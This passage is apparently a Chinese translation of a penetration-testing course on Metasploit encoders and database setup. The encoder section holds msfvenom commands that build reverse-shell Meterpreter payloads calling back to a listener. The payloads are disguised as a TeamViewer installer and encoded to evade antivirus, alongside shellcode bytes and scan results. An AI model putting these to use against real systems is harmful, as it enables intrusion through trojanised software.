class="line">&quot;\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9&quot; .</span><br><span class="line">&quot;\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde&quot; .</span><br><span class="line">&quot;\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f&quot; .</span><br><span class="line">&quot;\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7&quot; .</span><br><span class="line">&quot;\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>2015 年之后，这些脚本的更新已将它们合并到<code>msfvenom</code>工具中，该工具负责有效负载生成和编码。<code>msfvenom</code>后面我们会详细讲到。下面是今天的有效负载生成的示例<code>msfvenom</code>：</p><h4 id="生成有效载荷-无编码"><a href="#生成有效载荷-无编码" class="headerlink" title="生成有效载荷 - 无编码"></a>生成有效载荷 - 无编码</h4><p> 生成有效载荷 - 无编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl</span><br><span class="line"></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 381 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 381</span><br><span class="line">Payload size: 381 bytes</span><br><span class="line">Final size of perl file: 1674 bytes</span><br><span class="line">my $buf = </span><br><span class="line">&quot;\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9&quot; .</span><br><span class="line">&quot;\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37&quot; .</span><br><span class="line">&quot;\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1&quot; .</span><br><span class="line">&quot;\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91&quot; .</span><br><span class="line">&quot;\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31&quot; .</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>我们现在应该看一下的第一行<code>$buf</code>，看看它在应用像 . 这样的编码器时是如何变化的<code>shikata_ga_nai</code>。</p><h4 id="生成有效载荷-使用编码"><a href="#生成有效载荷-使用编码" class="headerlink" title="生成有效载荷 - 使用编码"></a>生成有效载荷 - 使用编码</h4><p> 生成有效载荷 - 使用编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00&quot; -f perl -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 326 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 353 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 380 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 380</span><br><span class="line">Payload size: 380 bytes</span><br><span class="line">buf = &quot;&quot;</span><br><span class="line">buf += &quot;\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31&quot;</span><br><span class="line">buf += &quot;\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32&quot;</span><br><span class="line">buf += &quot;\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94&quot;</span><br><span class="line">buf += &quot;\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e&quot;</span><br><span class="line">buf += &quot;\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e&quot;</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>如果我们想查看<code>shikata_ga_nai</code>编码器的功能，我们可以查看<a href="https://hatching.io/blog/metasploit-payloads2/">此处的</a>精彩帖子。</p><p>假设我们要为<code>existing payload</code>. 然后，我们可以使用<code>show encoders</code>中的命令<code>msfconsole</code>来查看哪些编码器可用于我们当前的<code>Exploit module + Payload</code>组合。</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #  Name              Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----              ---------------  ----    -----  -----------</span><br><span class="line">   0  generic/eicar                      manual  No     The EICAR Encoder</span><br><span class="line">   1  generic/none                       manual  No     The &quot;none&quot; Encoder</span><br><span class="line">   2  x64/xor                            manual  No     XOR Encoder</span><br><span class="line">   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder</span><br><span class="line">   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru</span><br></pre></td></tr></table></figure><p>在前面的例子中，我们只看到了一些适合 x64 系统的编码器。与可用的 payload 一样，这些都是根据 Exploit 模块自动过滤的，只显示兼容的。例如，让我们试试<code>MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit</code>.</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(ms09_050_smb2_negotiate_func_index) &gt; show encoders</span><br><span class="line"></span><br><span class="line">Compatible Encoders</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                    Disclosure Date  Rank       Description</span><br><span class="line">   ----                    ---------------  ----       -----------</span><br><span class="line">   generic/none                             normal     The &quot;none&quot; Encoder</span><br><span class="line">   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower</span><br><span class="line">   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder</span><br><span class="line">   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder</span><br><span class="line">   x86/countdown                            normal     Single-byte XOR Countdown Encoder</span><br><span class="line">   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">   x86/nonalpha                             low        Non-Alpha Encoder</span><br><span class="line">   x86/nonupper                             low        Non-Upper Encoder</span><br><span class="line">   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">   x86/single_static_bit                    manual     Single Static Bit</span><br><span class="line">   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><p>就拿上面的例子来说吧——一个假设的例子。如果我们只使用 SGN 对可执行负载进行一次编码，那么它很可能会被当今的大多数防病毒软件检测到。让我们深入研究一下。拿起处理<code>msfvenom</code>有效载荷生成和编码方案的框架的下标，我们有以下输入：</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 368</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: TeamViewerInstall.exe</span><br></pre></td></tr></table></figure><p>这将生成一个<code>exe</code>格式为 TeamViewerInstall.exe 的有效负载，该格式适用于 Windows 平台的 x86 架构处理器，具有隐藏的 Meterpreter reverse_tcp shell 有效负载，使用 Shikata Ga Nai 方案编码一次。让我们把结果上传到 VirusTotal。</p><p>一个更好的选择是尝试通过相同编码方案的多次迭代来运行它：</p><p> Shikata Ga Nai编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 10 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 395 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 422 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 449 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 476 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 503 (iteration=5)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 530 (iteration=6)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 557 (iteration=7)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 584 (iteration=8)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 611 (iteration=9)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 611</span><br><span class="line">Payload size: 611 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe</span><br></pre></td></tr></table></figure><p>正如我们所看到的，这仍然不足以进行 AV 规避。仍有大量产品可以检测有效负载。或者，Metasploit 提供了一个工具<code>msf-virustotal</code>，我们可以使用它和 API 密钥来分析我们的有效载荷。但是，这需要在 VirusTotal 上免费注册。</p><h4 id="无国界医生-VirusTotal"><a href="#无国界医生-VirusTotal" class="headerlink" title="无国界医生 - VirusTotal"></a>无国界医生 - VirusTotal</h4><p> 无国界医生 - VirusTotal</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload TeamViewerInstall.exe...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130</span><br><span class="line">[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9</span><br><span class="line">[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1651750343</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8</span><br><span class="line">==================================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version                                                         Result                                                     Update</span><br><span class="line"> ---------             --------  -------                                                         ------                                                     ------</span><br><span class="line"> ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> APEX                  true      6.288                                                           Malicious                                                  20220504</span><br><span class="line"> AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Acronis               true      1.2.0.108                                                       suspicious                                                 20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505</span><br><span class="line"> Alibaba               false     0.3.0.5                                                                                                                    20190527</span><br><span class="line"> Antiy-AVL             false     3.0                                                                                                                        20220505</span><br><span class="line"> Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505</span><br><span class="line"> Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505</span><br><span class="line"> Baidu                 false     1.0.0.2                                                                                                                    20190318</span><br><span class="line"> BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428</span><br><span class="line"> Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505</span><br><span class="line"> CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505</span><br><span class="line"> CMC                   false     2.10.2019.1                                                                                                                20211026</span><br><span class="line"> ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505</span><br><span class="line"> Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505</span><br><span class="line"> CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418</span><br><span class="line"> Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505</span><br><span class="line"> Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505</span><br><span class="line"> Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505</span><br><span class="line"> DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505</span><br><span class="line"> ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505</span><br><span class="line"> Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503</span><br><span class="line"> Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505</span><br><span class="line"> F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505</span><br><span class="line"> FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505</span><br><span class="line"> Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505</span><br><span class="line"> GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505</span><br><span class="line"> Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505</span><br><span class="line"> Jiangmin              false     16.0.100                                                                                                                   20220504</span><br><span class="line"> K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505</span><br><span class="line"> Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                                                                                              20220505</span><br><span class="line"> Lionic                false     7.5                                                                                                                        20220505</span><br><span class="line"> MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505</span><br><span class="line"> Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505</span><br><span class="line"> MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505</span><br><span class="line"> McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505</span><br><span class="line"> McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505</span><br><span class="line"> Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505</span><br><span class="line"> NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505</span><br><span class="line"> Paloalto              false     0.9.0.1003                                                                                                                 20220505</span><br><span class="line"> Panda                 false     4.6.4.2                                                                                                                    20220504</span><br><span class="line"> Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505</span><br><span class="line"> SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430</span><br><span class="line"> Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415</span><br><span class="line"> SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330</span><br><span class="line"> Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505</span><br><span class="line"> Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505</span><br><span class="line"> TACHYON               false     2022-05-05.02                                                                                                              20220505</span><br><span class="line"> Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505</span><br><span class="line"> TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505</span><br><span class="line"> VBA32                 false     5.0.0                                                                                                                      20220505</span><br><span class="line"> ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504</span><br><span class="line"> VirIT                 false     9.5.188                                                                                                                    20220504</span><br><span class="line"> Webroot               false     1.0.0.403                                                                                                                  20220505</span><br><span class="line"> Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428</span><br><span class="line"> Zillya                false     2.0.0.4625                                                                                                                 20220505</span><br><span class="line"> ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505</span><br><span class="line"> Zoner                 false     2.2.2.0                                                                                                                    20220504</span><br><span class="line"> tehtris               false     v0.1.2                                                                                                                     20220505</span><br></pre></td></tr></table></figure><p>正如预期的那样，我们在野外遇到的大多数反病毒产品仍会检测到此有效负载，因此我们将不得不使用本模块范围之外的其他方法来规避 AV。</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><hr><p><code>Databases</code>in<code>msfconsole</code>用于跟踪您的结果。毫无疑问，在更复杂的机器评估期间，更不用说整个网络了，由于搜索结果、入口点、检测到的问题、发现的凭据等的绝对数量，事情会变得有点模糊和复杂。</p><p>这就是数据库发挥作用的地方。<code>Msfconsole</code>内置了对 PostgreSQL 数据库系统的支持。有了它，我们可以直接、快速、轻松地访问扫描结果，并增加了与第三方工具一起导入和导出结果的能力。数据库条目也可用于直接使用现有的调查结果配置漏洞利用模块参数。</p><hr><h2 id="设置数据库"><a href="#设置数据库" class="headerlink" title="设置数据库"></a>设置数据库</h2><p>首先，我们必须确保 PostgreSQL 服务器在我们的主机上启动并运行。为此，请输入以下命令：</p><h4 id="PostgreSQL-状态"><a href="#PostgreSQL-状态" class="headerlink" title="PostgreSQL 状态"></a>PostgreSQL 状态</h4><p> PostgreSQL 状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo service postgresql status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago</span><br><span class="line">    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2147 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure><h4 id="启动-PostgreSQL"><a href="#启动-PostgreSQL" class="headerlink" title="启动 PostgreSQL"></a>启动 PostgreSQL</h4><p> 启动 PostgreSQL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo systemctl start postgresql</span><br></pre></td></tr></table></figure><p>启动 PostgreSQL 后，我们需要创建并初始化 MSF 数据库<code>msfdb init</code>。</p><h4 id="MSF-启动数据库"><a href="#MSF-启动数据库" class="headerlink" title="MSF - 启动数据库"></a>MSF - 启动数据库</h4><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[+] Creating database user &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf&#x27;</span><br><span class="line">[+] Creating databases &#x27;msf_test&#x27;</span><br><span class="line">[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;</span><br><span class="line">[+] Creating initial database schema</span><br><span class="line">rake aborted!</span><br><span class="line">NoMethodError: undefined method `without&#x27; for #&lt;Bundler::Settings:0x000055dddcf8cba8&gt;</span><br><span class="line">Did you mean? with_options</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>如果 Metasploit 不是最新的，有时会发生错误。这种导致错误的差异可能有多种原因。首先，通常它有助于再次更新 Metasploit ( <code>apt update</code>) 来解决这个问题。然后我们可以尝试重新初始化 MSF 数据库。</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb init</span><br><span class="line"></span><br><span class="line">[i] Database already started</span><br><span class="line">[i] The database appears to be already configured, skipping initialization</span><br></pre></td></tr></table></figure><p>如果初始化被跳过并且 Metasploit 告诉我们数据库已经配置好，我们可以重新检查数据库的状态。</p><p> MSF - 启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo msfdb status</span><br><span class="line"></span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago</span><br><span class="line">    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 2476 (code=exited, status=0/SUCCESS)</span><br><span class="line">        CPU: 1ms</span><br><span class="line"></span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.</span><br><span class="line"></span><br><span class="line">COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">postgres 2458 postgres    